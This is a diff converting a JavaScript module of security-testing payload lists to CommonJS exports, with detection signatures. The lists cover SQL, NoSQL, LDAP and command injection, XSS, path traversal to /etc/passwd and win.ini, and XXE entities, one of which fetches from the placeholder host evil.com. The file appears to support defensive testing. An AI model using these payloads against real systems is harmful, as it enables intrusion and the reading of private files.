@@ -1,4 +1,7 @@
-export const SQL_INJECTION_PAYLOADS = [
+"use strict";
+Object.defineProperty(exports, "__esModule", { value: true });
+exports.ALL_PAYLOADS = exports.ATTACK_VECTOR_MAP = exports.LONG_STRING_PAYLOADS = exports.SPECIAL_CHARACTERS = exports.NOSQL_INJECTION_PAYLOADS = exports.XML_INJECTION_PAYLOADS = exports.LDAP_INJECTION_PAYLOADS = exports.PATH_TRAVERSAL_PAYLOADS = exports.COMMAND_INJECTION_PAYLOADS = exports.XSS_PAYLOADS = exports.SQL_INJECTION_PAYLOADS = void 0;
+exports.SQL_INJECTION_PAYLOADS = [
     "' OR '1'='1",
     "' OR '1'='1' --",
     "' OR '1'='1' /*",
@@ -19,7 +22,7 @@ export const SQL_INJECTION_PAYLOADS = [
     "';",
     "\";",
 ];
-export const XSS_PAYLOADS = [
+exports.XSS_PAYLOADS = [
     "<script>alert('XSS')</script>",
     "<script>alert(1)</script>",
     "<img src=x onerror=alert('XSS')>",
@@ -36,7 +39,7 @@ export const XSS_PAYLOADS = [
     "%3Cscript%3Ealert('XSS')%3C/script%3E",
     "&#60;script&#62;alert('XSS')&#60;/script&#62;",
 ];
-export const COMMAND_INJECTION_PAYLOADS = [
+exports.COMMAND_INJECTION_PAYLOADS = [
     "; ls",
     "| ls",
     "& ls",
@@ -55,7 +58,7 @@ export const COMMAND_INJECTION_PAYLOADS = [
     "&",
     "\n",
 ];
-export const PATH_TRAVERSAL_PAYLOADS = [
+exports.PATH_TRAVERSAL_PAYLOADS = [
     "../",
     "..\\",
     "../../",
@@ -75,19 +78,19 @@ export const PATH_TRAVERSAL_PAYLOADS = [
     "/etc/passwd",
     "C:\\windows\\win.ini",
 ];
-export const LDAP_INJECTION_PAYLOADS = [
+exports.LDAP_INJECTION_PAYLOADS = [
     "*",
     "*)(&",
     "*)(objectClass=*",
     "admin*",
     "*)(uid=*))(|(uid=*",
 ];
-export const XML_INJECTION_PAYLOADS = [
+exports.XML_INJECTION_PAYLOADS = [
     "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
     "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/evil\">]><foo>&xxe;</foo>",
     "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><lolz>&lol2;</lolz>",
 ];
-export const NOSQL_INJECTION_PAYLOADS = [
+exports.NOSQL_INJECTION_PAYLOADS = [
     "[$ne]",
     "[$gt]",
     "[$regex]",
@@ -95,7 +98,7 @@ export const NOSQL_INJECTION_PAYLOADS = [
     "{$gt: ''}",
     "{$ne: null}",
 ];
-export const SPECIAL_CHARACTERS = [
+exports.SPECIAL_CHARACTERS = [
     "!@#$%^&*()",
     "<>?:\"{}_+",
     "\x00",
@@ -103,14 +106,14 @@ export const SPECIAL_CHARACTERS = [
     "\x0d",
     "\x1b",
 ];
-export const LONG_STRING_PAYLOADS = [
+exports.LONG_STRING_PAYLOADS = [
     "A".repeat(1000),
     "A".repeat(10000),
     "A".repeat(100000),
 ];
-export const ATTACK_VECTOR_MAP = [
+exports.ATTACK_VECTOR_MAP = [
     {
-        payloads: SQL_INJECTION_PAYLOADS,
+        payloads: exports.SQL_INJECTION_PAYLOADS,
         category: 'SQL Injection',
         description: 'SQL injection attack vectors',
         detectionSignatures: [
@@ -123,35 +126,35 @@ export const ATTACK_VECTOR_MAP = [
         ],
     },
     {
-        payloads: XSS_PAYLOADS,
+        payloads: exports.XSS_PAYLOADS,
         category: 'XSS',
         description: 'Cross-site scripting attack vectors',
         detectionSignatures: ['<script', 'onerror=', 'onload=', 'alert('],
     },
     {
-        payloads: COMMAND_INJECTION_PAYLOADS,
+        payloads: exports.COMMAND_INJECTION_PAYLOADS,
         category: 'Command Injection',
         description: 'OS command injection vectors',
         detectionSignatures: ['sh:', 'bash:', 'command not found'],
     },
     {
-        payloads: PATH_TRAVERSAL_PAYLOADS,
+        payloads: exports.PATH_TRAVERSAL_PAYLOADS,
         category: 'Path Traversal',
         description: 'Directory traversal attack vectors',
         detectionSignatures: ['root:', 'win.ini', '[extensions]'],
     },
     {
-        payloads: NOSQL_INJECTION_PAYLOADS,
+        payloads: exports.NOSQL_INJECTION_PAYLOADS,
         category: 'NoSQL Injection',
         description: 'NoSQL injection attack vectors',
     },
 ];
-export const ALL_PAYLOADS = [
-    ...SQL_INJECTION_PAYLOADS,
-    ...XSS_PAYLOADS,
-    ...COMMAND_INJECTION_PAYLOADS,
-    ...PATH_TRAVERSAL_PAYLOADS,
-    ...LDAP_INJECTION_PAYLOADS,
-    ...NOSQL_INJECTION_PAYLOADS,
+exports.ALL_PAYLOADS = [
+    ...exports.SQL_INJECTION_PAYLOADS,
+    ...exports.XSS_PAYLOADS,
+    ...exports.COMMAND_INJECTION_PAYLOADS,
+    ...exports.PATH_TRAVERSAL_PAYLOADS,
+    ...exports.LDAP_INJECTION_PAYLOADS,
+    ...exports.NOSQL_INJECTION_PAYLOADS,
 ];
 //# sourceMappingURL=attack-vectors.js.map
